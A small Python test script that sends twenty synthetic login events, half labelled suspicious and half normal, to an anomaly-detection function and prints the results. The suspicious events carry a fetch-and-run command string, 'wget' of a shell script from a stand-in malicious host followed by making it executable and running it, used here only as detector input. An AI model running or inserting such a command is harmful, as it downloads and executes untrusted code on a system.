from Scripts.ml import run_anomaly_detection
import random
import string

# Helper to generate random IPs and strings
def random_ip():
    return f"192.168.1.{random.randint(1, 254)}"

def random_str(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Run 20 test events (some normal, some weird)
for i in range(20):
    # Alternate between normal and suspicious
    if i % 2 == 0:
        # Suspicious: spoofed IP, long weird command
        ip = f"{random.randint(50, 250)}.{random.randint(10, 200)}.{random.randint(10, 200)}.{random.randint(100, 255)}"
        username = random_str(random.randint(8, 12))
        password = random_str(random.randint(10, 20))
        command = "wget http://malicious.site/malware.sh && chmod +x malware.sh && ./malware.sh"
    else:
        # Normal: local IP, simple login attempt
        ip = random_ip()
        username = "admin"
        password = "1234"
        command = "ls -la"

    is_anomaly = run_anomaly_detection(ip, username, password, command)
    print(f"[{i+1:02d}] IP: {ip} | Anomaly: {is_anomaly}")
